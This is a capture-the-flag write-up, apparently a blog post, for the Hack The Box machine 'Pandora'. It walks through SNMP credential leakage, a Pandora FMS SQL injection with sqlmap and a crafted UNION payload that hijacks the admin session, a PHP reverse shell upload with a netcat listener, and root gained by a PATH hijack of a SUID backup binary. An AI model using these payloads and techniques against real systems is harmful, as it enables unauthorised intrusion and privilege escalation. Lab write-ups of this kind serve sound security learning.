---
layout: post
title: HTB Pandora Writeup  
subtitle: Easy Box
thumbnail-img: /assets/img/pandora/pandora.png
tags: [HTB]
---
![Pandorad](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/pandora/pandora.png)


| Name | Pandora |
| :------ |:--- |
| OS | Linux |
| RELEASE DATE | 08 Jan 2022 |
| DIFFICULTY | Windows |

# Port Scan

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Play | Landing
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# TCP Port 80

Going to the webpage it is advertising some kind of network monitoring service. Looking at the contents of the page we see two email addresses an a domain name `support@panda.htb` and `contact@panda.htb`. I added `panda.htb` to my `/etc/hosts` file

I decided to use `ffuf` to try and see if I could enumerate any more DNS names but had no luck

```
┌──(root💀kali)-[~/htb/pandora/nmap]
└─# ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://panda.htb -H "Host: FUZZ.panda.htb" -fw 13127

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://panda.htb
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.panda.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 13127
________________________________________________

:: Progress: [4989/4989] :: Job [1/1] :: 456 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
```

Next I tried to fuzz out more files and directories to play with

```
┌──(root💀kali)-[~/htb/pandora/nmap]
└─# ffuf -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://panda.htb/FUZZ                              

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://panda.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

assets                  [Status: 301, Size: 307, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 274, Words: 20, Lines: 10]
                        [Status: 200, Size: 33560, Words: 13127, Lines: 908]
```

I poked around in the assets folder for a while but was unable to find anything interesting. I was able to leak the version of apache and the hostname (again) by going to a invalid page like `http://panda.htb/abc` `Apache/2.4.41 (Ubuntu) Server at panda.htb Port 80`

# UDP Port 161

I played around with a few other things but still had no luck. I decided to go back and see if there were any open UDP ports and there was! `161/udp -- snmp`

```
# Nmap 7.92 scan initiated Sat Jan  8 18:13:28 2022 as: nmap -sU -oN nmap/udp.nmap -v panda.htb
Nmap scan report for panda.htb (10.129.249.226)
Host is up (0.078s latency).
Not shown: 998 closed udp ports (port-unreach)
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
161/udp open          snmp

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Jan  8 18:31:43 2022 -- 1 IP address (1 host up) scanned in 1095.12 seconds
```

SNMP stands for "Simple Network Management Protocol" and is based of a client-server model. It is used to monitor different devices in the network (like routers, switches, printers, IoTs...). https://book.hacktricks.xyz/pentesting/pentesting-snmp.

There is a tool called `snmpwalk` that I used to enumerate some information. `snmpwalk -v1 -c public panda.htb` the syntax explained is `snmpwalk -v [VERSION_SNMP] -c [COMM_STRING] [DIR_IP]`. After it ran for a while I was able to find a username and password, along with other useful information

```
iso.3.6.1.2.1.25.4.2.1.5.972 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'" 
iso.3.6.1.2.1.25.4.2.1.5.1119 = STRING: "-u daniel -p HotelBabylon23"   
iso.3.6.1.2.1.1.3.0 = Timeticks: (262575) 0:43:45.75                                                       
iso.3.6.1.2.1.1.4.0 = STRING: "Daniel"                                                                                                                       
iso.3.6.1.2.1.1.5.0 = STRING: "pandora"                                                                                                                      
iso.3.6.1.2.1.1.6.0 = STRING: "Mississippi" 

```

I used the credentials `daniel:HotelBabylon23` to ssh into the box

# Pandora FMS

Looking at `ls /var/www/` I see that there is another website running on this machine called "Pandora FMS" and is probably running on the `localhost` as I could not access it from the main page. I can confirm this by looking at the config file in `/etc/apache2/sites-enabled/pandora.conf`. Looking at it I can see that it is indeed only on the local host vs the other site that is on the public interface.

```
#pandora.conf
<VirtualHost localhost:80>
```

In order to access this web app I will need to port forward to my kali machine. SSH tunneling will do a fine job. `ssh -L 32000:127.0.0.1:80 daniel@PANDORA_IP`. This will tunnel Pandora's `localhost:80`
to my kali `localhost:32000`.

![Pandorad](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/pandora/19b7c5f8dd5f4a6d958c54c315244922.png)

I tried using Daniels credentials to login but was prompted with a box that said "error user only can use API"

![Pandorad](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/pandora/277c8c96364b4c34b730901557fbc9b8.png)


I was able to use the api to do lots of cool things like dump users and passwords. Here is the documentation for reference  [https://pandorafms.com/manual/en/documentation/08\_technical\_reference/02\_annex\_externalapi](https://pandorafms.com/manual/en/documentation/08_technical_reference/02_annex_externalapi)

![Pandorad](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/pandora/c05577c4241b4f4bab2fdbebec16e592.png)

![Pandorad](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/pandora/37d5ae9ba9cd4753845069d05d6e0692.png)

I tried to rack these passwords but had no luck.

After looking around I was able to find an article describing a SQL Injection, we might be able to leverage this and get the admins `PHPSESSID` https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained

The article describes that there is a parameter called `session_id` inside `/include/chart_generator.php`. We can do a quick test using `sqlmap -u 127.0.0.1:32000/pandora_console/include/chart_generator.php?session_id=123` to confirm.

```
Parameter: session_id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: session_id=-8479' OR 6144=6144#

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: session_id=123' OR (SELECT 1715 FROM(SELECT COUNT(*),CONCAT(0x716b6b6a71,(SELECT (ELT(1715=1715,1))),0x7170766a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- IjJu

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: session_id=123' AND (SELECT 7641 FROM (SELECT(SLEEP(5)))MouN)-- NPgC
---
[15:21:56] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 19.10 or 20.04 (eoan or focal)
web application technology: PHP, Apache 2.4.41
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
```

Then I crafted a request to take advantage of this `http://127.0.0.1:32000/pandora_console/include/chart_generator.php?session_id=asdfasdf%27%20UNION%20SELECT%20%27TUTAJ_TWOJE_PHPSESSID%27,123412341234,%27id_usuario|s:5:%22admin%22;%27;--%20-`

Then after making that request I now have the admins cookie and can bypass the login

![Pandorad](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/pandora/cd668c8e843742efb40fb3175b20f935.png)

Under admin tools, I can see that I have access to upload a file, since this web app is running php I used a php reverse shell replacing the IP and PORT to my own https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

![Pandorad](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/pandora/3c073d133ffa462780d3e5919359b1df.png)

Now I can set up my listener
`nc -lvnp 1234`

Then curl the page
`curl http://localhost:32000/pandora_console/images/php-reverse-shell.php`

And we have a shell as Matt!

```
$ id
uid=1000(matt) gid=1000(matt) groups=1000(matt)
```

# Priv Esc

To obtain easier access to the machine I put my public ssh key on the box. I had to `chmod 600` the `authorized_keys`. On most distros if the authorized\_key file is specified in the sshd\_config, then it will automatically apply the perms, but on this one it did not

```
$ ssh-keygen
[.........]

$ cd /home/matt/.ssh                                                          
$ ls                                                                          
id_rsa                                                                        
id_rsa.pub                                                                    
$ touch authorized_keys                                                       
$ echo "YOUR ID_RSA.PUB" > authorized_keys
$ chmod 600 authorized_keys

#Now on kali
┌──(root💀kali)-[~]
└─ ssh matt@10.129.251.233 
[.........]
tt@pandora:~$ id
uid=1000(matt) gid=1000(matt) groups=1000(matt) 
```

Looking for SUID binaries I found a interesting one called `/usr/bin/pandora_backup`

```
matt@pandora:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/pandora_backup
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/at
/usr/bin/fusermount
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
```

I copied it over to my kali machine and ran `strings` against it to see what was going on. I saw that it was using `tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*`. It also was not an absolute path to `tar` so I can make my own version that gives me root

```
matt@pandora:~$ cd /tmp                                                                                                                                      
matt@pandora:/tmp$ touch tar                                                                                                                                 
matt@pandora:/tmp$ echo "/bin/sh" > tar                                                                                                                  
matt@pandora:/tmp$ chmod 777 tar
matt@pandora:/tmp$ export PATH=/tmp:$PATH

matt@pandora:/tmp$ /usr/bin/pandora_backup 
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
# id
uid=0(root) gid=1000(matt) groups=1000(matt)
```

This works because when the script goes to run `tar` it will default to my malicious one first. You can read more about it here https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/

In order for this to work you need to be logged into ssh. If you keep the web shell you are www-data impersonating matt, and the mpm_itk module that handles user assignments to apache process disables SUID by default for protection.
